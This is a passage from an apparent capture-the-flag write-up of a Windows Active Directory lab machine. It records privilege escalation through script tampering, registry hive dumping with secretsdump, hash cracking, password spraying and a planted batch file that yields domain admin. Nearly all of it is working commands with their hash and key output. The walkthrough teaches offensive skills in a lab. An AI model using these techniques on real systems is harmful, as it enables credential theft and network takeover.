+evil-winrm-py PS C:\Users\edavies\Documents&gt;</code></pre><p>There is an interesting file on the desktop</p><pre><span class="bt-code-lang" aria-hidden="true">python</span><code class="language-python">evil-winrm-py PS C:\Users\edavies\Documents&gt; Invoke-Command -ComputerName ATSSERVER -ScriptBlock {cat C:\Users\imonks\Desktop\wm.ps1} -Credential $cred -ConfigurationName dc_manage
+$securepasswd = &#39;01000000d08c9ddf0115d1118c7a00c04fc297eb0100000096ed5ae76bd0da4c825bdd9f24083e5c0000000002000000000003660000c00000001000000080f704e251793f5d4f903c7158c8213d0000000004800000a000000010000000ac2606ccfda6b4e0a9d56a20417d2f67280000009497141b794c6cb963d2460bd96ddcea35b25ff248a53af0924572cd3ee91a28dba01e062ef1c026140000000f66f5cec1b264411d8a263a2ca854bc6e453c51&#39;
+$passwd = $securepasswd | ConvertTo-SecureString
+$creds = New-Object System.Management.Automation.PSCredential (&quot;acute\jmorgan&quot;, $passwd)
+Invoke-Command -ScriptBlock {Get-Volume} -ComputerName Acute-PC01 -Credential $creds
+evil-winrm-py PS C:\Users\edavies\Documents&gt;</code></pre><p>The user <code>jmorgan</code> is in the administrators group on the <code>acute-pc01</code></p><pre><span class="bt-code-lang" aria-hidden="true">python</span><code class="language-python">evil-winrm-py PS C:\Users\edavies\Documents&gt; Invoke-Command -ComputerName ATSSERVER -ScriptBlock {((cat C:\Users\imonks\Desktop\wm.ps1 -Raw) -replace &#39;Get-Volume&#39;, &#39;net localgroup Administrators edavies /add&#39;) | sc -Path C:\Users\imonks\Desktop\wm.ps1} -Credential $cred -ConfigurationName dc_manage</code></pre><p>This command will add the current user to the administrators group</p><pre><span class="bt-code-lang" aria-hidden="true">python</span><code class="language-python">evil-winrm-py PS C:\Users\edavies\Documents&gt; Invoke-Command -ComputerName ATSSERVER -ScriptBlock {C:\Users\imonks\Desktop\wm.ps1} -Credential $cred -ConfigurationName dc_manage
+The command completed successfully.
+
+evil-winrm-py PS C:\Users\edavies\Documents&gt;</code></pre><p>Then ill just run the script</p><pre><span class="bt-code-lang" aria-hidden="true">python</span><code class="language-python">evil-winrm-py PS C:\Users\edavies\Documents&gt; whoami /priv
+
+PRIVILEGES INFORMATION
+----------------------
+
+Privilege Name                            Description                                                        State  
+========================================= ================================================================== =======
+SeIncreaseQuotaPrivilege                  Adjust memory quotas for a process                                 Enabled
+SeSecurityPrivilege                       Manage auditing and security log                                   Enabled
+SeTakeOwnershipPrivilege                  Take ownership of files or other objects                           Enabled
+SeLoadDriverPrivilege                     Load and unload device drivers                                     Enabled
+SeSystemProfilePrivilege                  Profile system performance                                         Enabled
+SeSystemtimePrivilege                     Change the system time                                             Enabled
+SeProfileSingleProcessPrivilege           Profile single process                                             Enabled
+SeIncreaseBasePriorityPrivilege           Increase scheduling priority                                       Enabled
+SeCreatePagefilePrivilege                 Create a pagefile                                                  Enabled
+SeBackupPrivilege                         Back up files and directories                                      Enabled
+SeRestorePrivilege                        Restore files and directories                                      Enabled
+SeShutdownPrivilege                       Shut down the system                                               Enabled
+SeDebugPrivilege                          Debug programs                                                     Enabled
+SeSystemEnvironmentPrivilege              Modify firmware environment values                                 Enabled
+SeChangeNotifyPrivilege                   Bypass traverse checking                                           Enabled
+SeRemoteShutdownPrivilege                 Force shutdown from a remote system                                Enabled
+SeUndockPrivilege                         Remove computer from docking station                               Enabled
+SeManageVolumePrivilege                   Perform volume maintenance tasks                                   Enabled
+SeImpersonatePrivilege                    Impersonate a client after authentication                          Enabled
+SeCreateGlobalPrivilege                   Create global objects                                              Enabled
+SeIncreaseWorkingSetPrivilege             Increase a process working set                                     Enabled
+SeTimeZonePrivilege                       Change the time zone                                               Enabled
+SeCreateSymbolicLinkPrivilege             Create symbolic links                                              Enabled
+SeDelegateSessionUserImpersonatePrivilege Obtain an impersonation token for another user in the same session Enabled
+evil-winrm-py PS C:\Users\edavies\Documents&gt;</code></pre><p>And after logging out and logging back in i am now an admin on <code>Acute-PC01</code></p><h2>Dumping <code>SAM</code> <code>SYSTEM</code> and <code>SECURITY</code></h2><pre><span class="bt-code-lang" aria-hidden="true">python</span><code class="language-python">evil-winrm-py PS C:\Utils&gt; reg save hklm\system C:\Temp\system.bak
+The operation completed successfully.
+
+evil-winrm-py PS C:\Utils&gt; reg save hklm\sam C:\Temp\sam.bak
+The operation completed successfully.
+
+evil-winrm-py PS C:\Temp&gt; reg save hklm\security C:\Temp\security.bak
+The operation completed successfully.</code></pre><p>First ill save copies to temp</p><pre><span class="bt-code-lang" aria-hidden="true">python</span><code class="language-python">evil-winrm-py PS C:\Temp&gt; download sam.bak .
+Downloading C:\Temp\sam.bak: 64.0kB [00:00, 209MB/s]                                                         
+[+] File downloaded successfully and saved as: /home/kali/htb/acute/sam.bak
+evil-winrm-py PS C:\Temp&gt; download system.bak .
+Downloading C:\Temp\system.bak: 100%|███████████████████████████████████| 11.6M/11.6M [00:05&lt;00:00, 2.42MB/s]
+[+] File downloaded successfully and saved as: /home/kali/htb/acute/system.bak
+evil-winrm-py PS C:\Temp&gt; download security.bak .
+Downloading C:\Temp\security.bak: 64.0kB [00:00, 352MB/s]                                                    
+[+] File downloaded successfully and saved as: /home/kali/htb/acute/security.bak</code></pre><p>Then ill download all the files</p><pre><span class="bt-code-lang" aria-hidden="true">python</span><code class="language-python">❯❯❯ secretsdump.py -sam sam.bak -system system.bak -security security.bak LOCAL 
+Impacket v0.13.1 - Copyright Fortra, LLC and its affiliated companies 
+
+[*] Target system bootKey: 0x44397c32a634e3d8d8f64bff8c614af7
+[*] Dumping local SAM hashes (uid:rid:lmhash:nthash)
+Administrator:500:aad3b435b51404eeaad3b435b51404ee:a29f7623fd11550def0192de9246f46b:::
+Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+WDAGUtilityAccount:504:aad3b435b51404eeaad3b435b51404ee:24571eab88ac0e2dcef127b8e9ad4740:::
+Natasha:1001:aad3b435b51404eeaad3b435b51404ee:29ab86c5c4d2aab957763e5c1720486d:::
+[*] Dumping cached domain logon information (domain/username:hash)
+[*] Dumping LSA Secrets
+[*] $MACHINE.ACC 
+ACUTE\ACUTE-PC01$:aes256-cts-hmac-sha1-96:be9a3601da45d14d6e11b5364cdf943c6050b4dc325120c6931d77d55ea77774
+ACUTE\ACUTE-PC01$:aes128-cts-hmac-sha1-96:10b79d6f6567a7a4fe3b15033129a496
+ACUTE\ACUTE-PC01$:des-cbc-md5:15d06815f17054ef
+ACUTE\ACUTE-PC01$:plain_password_hex:385ff9866bd5f5787b3d2407f138ef11820d1878ff3867d3339eb3214622b619fb7beefbe8011f0c60143237c4fc237268dd2a7b28e3865e31a64a0634cbbdcc74d392136c69b47022b6ba57728b2f1eb9c14079a24c483c9357d2ac2c16553a0e473c9f47e24cc11291de8c381e50836a0a09b728bfe62239bee7dd00f1e5445bbd9786a12d846564573955bcb0f69b2f2aed3682b12680fc899c2b34254da22d058b7efbd37c973f6aa55981bb9328527778fdcf502c091ee87886209d17d1ecfd9b482e3cca85b2daa4af2148401ed47968ee78007f6c4511be37579a87326cd501cdc16676b5c21194bd8062db36
+ACUTE\ACUTE-PC01$:aad3b435b51404eeaad3b435b51404ee:d153d12682a0b4f0712c7f2e6e0dade8:::
+[*] DPAPI_SYSTEM 
+dpapi_machinekey:0x574d0cc939c9f986cba32d1546a7fa28747425e0
+dpapi_userkey:0x4a77ea6673a027ecd81e4ca010b1d3f70fe1d9cd
+[*] NL$KM 
+ 0000   62 2A 29 8D F9 77 CC DD  EE EB 23 20 B2 E2 AF 59   b*)..w....# ...Y
+ 0010   0B F6 33 E0 95 5D B0 03  B1 01 85 55 9D 16 64 4D   ..3..].....U..dM
+ 0020   53 1F 93 7B FB EF 2B F7  6E 76 B1 02 3D 63 CC DF   S..{..+.nv..=c..
+ 0030   F0 35 6F E3 19 8A 69 C1  2E F6 78 80 45 51 EE 0A   .5o...i...x.EQ..
+NL$KM:622a298df977ccddeeeb2320b2e2af590bf633e0955db003b10185559d16644d531f937bfbef2bf76e76b1023d63ccdff0356fe3198a69c12ef678804551ee0a
+[*] Cleaning up... </code></pre><p>There is no plaintext LSA passwords</p><pre><span class="bt-code-lang" aria-hidden="true">python</span><code class="language-python">❯❯❯ hashcat -m 1000 &#39;a29f7623fd11550def0192de9246f46b&#39; /usr/share/wordlists/rockyou.txt
+
+a29f7623fd11550def0192de9246f46b:Password@123 </code></pre><p>The administrator accounts hash cracked</p><h2>Password spray leads to user compromise</h2><pre><span class="bt-code-lang" aria-hidden="true">python</span><code class="language-python">❯❯❯ nxc smb atsserver.acute.local -u users.txt -p &#39;Password@123&#39; -k --continue-on-success 
+SMB         atsserver.acute.local 445    atsserver        [*]  x64 (name:atsserver) (domain:acute.local) (signing:True) (SMBv1:None) (NTLM:False)
+SMB         atsserver.acute.local 445    atsserver        [-] acute.local\Administrator:Password@123 KDC_ERR_PREAUTH_FAILED 
+SMB         atsserver.acute.local 445    atsserver        [-] acute.local\Guest:Password@123 KDC_ERR_CLIENT_REVOKED 
+SMB         atsserver.acute.local 445    atsserver        [-] acute.local\krbtgt:Password@123 KDC_ERR_CLIENT_REVOKED 
+SMB         atsserver.acute.local 445    atsserver        [-] acute.local\ATSSERVER$:Password@123 KDC_ERR_PREAUTH_FAILED 
+SMB         atsserver.acute.local 445    atsserver        [-] acute.local\MARVEL-PC01$:Password@123 KDC_ERR_PREAUTH_FAILED 
+SMB         atsserver.acute.local 445    atsserver        [+] acute.local\awallace:Password@123 
+SMB         atsserver.acute.local 445    atsserver        [-] acute.local\chall:Password@123 KDC_ERR_PREAUTH_FAILED 
+SMB         atsserver.acute.local 445    atsserver        [-] acute.local\edavies:Password@123 KDC_ERR_PREAUTH_FAILED 
+SMB         atsserver.acute.local 445    atsserver        [-] acute.local\imonks:Password@123 KDC_ERR_PREAUTH_FAILED 
+SMB         atsserver.acute.local 445    atsserver        [-] acute.local\jmorgan:Password@123 KDC_ERR_PREAUTH_FAILED 
+SMB         atsserver.acute.local 445    atsserver        [-] acute.local\lhopkins:Password@123 KDC_ERR_PREAUTH_FAILED 
+SMB         atsserver.acute.local 445    atsserver        [-] acute.local\ACUTE-PC01$:Password@123 KDC_ERR_PREAUTH_FAILED</code></pre><p>I have compromised <code>awallace</code></p><h2>Domain Admin</h2><pre><span class="bt-code-lang" aria-hidden="true">python</span><code class="language-python">evil-winrm-py PS C:\Temp&gt; $pass = ConvertTo-SecureString &quot;Password@123&quot; -AsPlainText -Force
+evil-winrm-py PS C:\Temp&gt; $cred = New-Object System.Management.Automation.PSCredential(&quot;ACUTE\awallace&quot;, $pass)</code></pre><p>Once again ill set up another credential for the new user</p><pre><span class="bt-code-lang" aria-hidden="true">python</span><code class="language-python">evil-winrm-py PS C:\Temp&gt; Invoke-Command -ComputerName ATSSERVER -ScriptBlock {whoami} -Credential $cred -ConfigurationName dc_manage
+acute\awallace</code></pre><p>And this proves i can execute commands as this user</p><pre><span class="bt-code-lang" aria-hidden="true">python</span><code class="language-python">evil-winrm-py PS C:\Temp&gt; Invoke-Command -ComputerName ATSSERVER -ScriptBlock {ls &quot;C:\Program Files\keepmeon&quot;} -Credential $cred -ConfigurationName dc_manage
+
+
+    Directory: C:\Program Files\keepmeon
+
+
+Mode                 LastWriteTime         Length Name                                PSComputerName                    
+----                 -------------         ------ ----                                --------------                    
+-a----        12/21/2021   2:57 PM            128 keepmeon.bat                        ATSSERVER                         
+
+
+evil-winrm-py PS C:\Temp&gt; Invoke-Command -ComputerName ATSSERVER -ScriptBlock {cat &quot;C:\Program Files\keepmeon\keepmeon.bat&quot;} -Credential $cred -ConfigurationName dc_manage
+REM This is run every 5 minutes. For Lois use ONLY
+@echo off
+ for /R %%x in (*.bat) do (
+ if not &quot;%%x&quot; == &quot;%~0&quot; call &quot;%%x&quot;
+)
+evil-winrm-py PS C:\Temp&gt;</code></pre><p>There is an interesting script in program files</p><blockquote><p>This script is a Windows batch file designed to recursively find and run every other batch file (.bat) within its current folder and all subfolders, except for itself.</p></blockquote><p>So if i create my own batch file in the same dir it will run</p><pre><span class="bt-code-lang" aria-hidden="true">python</span><code class="language-python">evil-winrm-py PS C:\Temp&gt; Invoke-Command -ComputerName ATSSERVER -ScriptBlock {Set-Content -Path &quot;C:\Program Files\keepmeon\DA.bat&quot; -Value &#39;net group site_admin awallace /add /domain&#39;} -Credential $cred -ConfigurationName dc_manage</code></pre><p>Ill make a batch script to add the current user to the site_admin group</p><p><img src="images/acute/pasted-image-20261022201624.webp" alt="Screenshot" loading="lazy" /></p><p>This group is a member of the administrators group</p><p>After a few minutes i try auth with nxc on the user <code>awallace</code> i this user is now an admin</p><p>But this is soon reset, so ill run a command to make it more permanant</p><pre><span class="bt-code-lang" aria-hidden="true">python</span><code class="language-python">❯❯❯ nxc smb atsserver.acute.local -u awallace -p &#39;Password@123&#39; -k -X &#39;net localgroup Administrators awallace /add&#39;
+SMB         atsserver.acute.local 445    atsserver        [*]  x64 (name:atsserver) (domain:acute.local) (signing:True) (SMBv1:None) (NTLM:False)
+SMB         atsserver.acute.local 445    atsserver        [+] acute.local\awallace:Password@123 (Pwn3d!)
+SMB         atsserver.acute.local 445    atsserver        [+] Executed command via wmiexec
+SMB         atsserver.acute.local 445    atsserver        The command completed successfully.</code></pre><p>Ill add the user to the administrators group, this likely wont get reset if its added directly</p><pre><span class="bt-code-lang" aria-hidden="true">python</span><code class="language-python">❯❯❯ evil-winrm-py -i atsserver.acute.local -u awallace -p &#39;Password@123&#39; -k
+          _ _            _                             
+  _____ _(_| |_____ __ _(_)_ _  _ _ _ __ ___ _ __ _  _ 
+ / -_\ V | | |___\ V  V | | &#39; \| &#39;_| &#39;  |___| &#39;_ | || |
+ \___|\_/|_|_|    \_/\_/|_|_||_|_| |_|_|_|  | .__/\_, |
+                                            |_|   |__/  v1.6.0
+
+[*] Connecting to &#39;atsserver.acute.local:5985&#39; as &#39;awallace&#39;
+evil-winrm-py PS C:\Users\awallace\Documents&gt; whoami /priv
+
+PRIVILEGES INFORMATION
+----------------------
+
+Privilege Name                            Description                                                        State  
+========================================= ================================================================== =======
+SeIncreaseQuotaPrivilege                  Adjust memory quotas for a process                                 Enabled
+SeMachineAccountPrivilege                 Add workstations to domain                                         Enabled
+SeSecurityPrivilege                       Manage auditing and security log                                   Enabled
+SeTakeOwnershipPrivilege                  Take ownership of files or other objects                           Enabled
+SeLoadDriverPrivilege                     Load and unload device drivers                                     Enabled
+SeSystemProfilePrivilege                  Profile system performance                                         Enabled
+SeSystemtimePrivilege                     Change the system time                                             Enabled
+SeProfileSingleProcessPrivilege           Profile single process                                             Enabled
+SeIncreaseBasePriorityPrivilege           Increase scheduling priority                                       Enabled
+SeCreatePagefilePrivilege                 Create a pagefile                                                  Enabled
+SeBackupPrivilege                         Back up files and directories                                      Enabled
+SeRestorePrivilege                        Restore files and directories                                      Enabled
+SeShutdownPrivilege                       Shut down the system                                               Enabled
+SeDebugPrivilege                          Debug programs                                                     Enabled
+SeSystemEnvironmentPrivilege              Modify firmware environment values                                 Enabled
+SeChangeNotifyPrivilege                   Bypass traverse checking                                           Enabled
+SeRemoteShutdownPrivilege                 Force shutdown from a remote system                                Enabled
+SeUndockPrivilege                         Remove computer from docking station                               Enabled
+SeEnableDelegationPrivilege               Enable computer and user accounts to be trusted for delegation     Enabled
+SeManageVolumePrivilege                   Perform volume maintenance tasks                                   Enabled
+SeImpersonatePrivilege                    Impersonate a client after authentication                          Enabled
+SeCreateGlobalPrivilege                   Create global objects                                              Enabled
+SeIncreaseWorkingSetPrivilege             Increase a process working set                                     Enabled
+SeTimeZonePrivilege                       Change the time zone                                               Enabled
+SeCreateSymbolicLinkPrivilege             Create symbolic links                                              Enabled
+SeDelegateSessionUserImpersonatePrivilege Obtain an impersonation token for another user in the same session Enabled
+evil-winrm-py PS C:\Users\awallace\Documents&gt;</code></pre><p>Then i can login as the DA</p><pre><span class="bt-code-lang" aria-hidden="true">python</span><code class="language-python">evil-winrm-py PS C:\Users\Administrator\Desktop&gt; dir
+
+
+    Directory: C:\Users\Administrator\Desktop
+
+
+Mode                LastWriteTime         Length Name                                                                   
+----                -------------         ------ ----                                                                   
+-ar---       10/22/2026   4:24 PM             34 root.txt                                                               
+
+
+evil-winrm-py PS C:\Users\Administrator\Desktop&gt;</code></pre><p>Then i can get the root flag</p></div><footer class="writeup-article-footer"><nav class="writeup-viewer-pagination writeup-page-pager" aria-label="More writeups"><a class="action secondary writeup-nav-button" href="/writeups/htb/ethan-bauer/htb-checkpoint/" rel="prev"><span class="writeup-nav-direction">Previous</span><span class="writeup-nav-title">Checkpoint</span></a><a class="action secondary writeup-nav-button" href="/writeups/htb/ethan-bauer/htb-rustykey/" rel="next"><span class="writeup-nav-direction">Next</span><span class="writeup-nav-title">RustyKey</span></a></nav><a href="/writeups/">← All writeups</a></footer></article></main><footer class="site-footer site-footer-unified"><div class="footer-brand"><strong>Paracausal Telemetry</strong><blockquote class="footer-quote"><p>&ldquo;Curiouser and curiouser.&rdquo;</p><span class="footer-quote-cite">Lewis Carroll</span></blockquote></div><div class="footer-nav-groups"><div class="footer-nav-group"><span>Explore</span><nav class="footer-links" aria-label="Primary footer navigation"><a href="/writeups/">Writeups</a><a href="/cpts/">CPTS</a><a href="/links/">Links</a><a href="/field-guides/">Field guides</a><a href="/#talks">Talks</a><a href="/#observer">Observer</a><a href="/#threat-actors">Threat Actors</a><a href="https://alchemist.paracausaltelemetry.com/" aria-label="Alchemist (opens the separate Alchemist app)">Alchemist<svg class="nav-external" viewBox="0 0 12 12" aria-hidden="true" focusable="false"><path d="M4 2h6v6M10 2 3 9"/></svg></a></nav></div></div><p class="footer-note"><span>paracausaltelemetry.com</span><span>2026</span></p></footer></div><script type="module" src="/js/writeup-page.js?v=search2"></script></body></html>
